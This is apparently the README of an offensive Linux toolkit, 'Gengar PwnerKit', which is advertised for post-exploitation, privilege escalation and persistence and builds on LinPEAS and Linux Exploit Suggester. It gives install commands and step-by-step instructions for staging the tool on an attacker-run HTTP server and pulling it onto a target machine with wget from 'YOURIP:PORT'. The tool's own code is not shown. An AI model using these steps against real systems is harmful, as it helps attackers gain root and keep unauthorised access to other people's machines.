# Gengar PwnerKit
> ## | Post Exploration | Privilege Escalation | Persistence |
> 
>                  ![image](https://github.com/h0ru/gpk/blob/main/gengar.gif)
>
> ---

> ## How to install?
> ### Wget:
> ```
> wget -q https://raw.githubusercontent.com/h0ru/gpk/main/gpk -O gpk ; chmod +x gpk
> ```
> ### Curl: 
> ```
> curl -q https://raw.githubusercontent.com/h0ru/gpk/main/gpk -o gpk ; chmod +x gpk
> ```
> ---

> ## How to upload to targets machine?
> ### 1. Download the GPK
> ### 2. Attacker Machine:  
> ```
> python3 -m http.server PORT
> ``` 
> ### 3. Target Machine:
> ```
> wget YOURIP:PORT/gpk ; chmod +x gpk
> ```
> ---

> ## GPK uses these other scripts
> ### ➫ [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
> ### ➫ [Linux Exploit Suggester ](https://github.com/The-Z-Labs/linux-exploit-suggester)
> ---
